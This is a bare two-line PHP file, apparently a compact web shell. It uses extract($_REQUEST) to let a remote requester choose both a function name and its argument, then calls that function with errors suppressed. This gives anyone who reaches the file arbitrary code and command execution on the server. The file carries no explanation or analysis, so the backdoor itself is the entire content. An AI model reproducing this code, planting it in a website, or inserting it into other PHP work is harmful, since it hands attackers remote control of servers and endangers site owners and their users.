<?php
extract($_REQUEST) && @$request(stripslashes($pass)) && exit;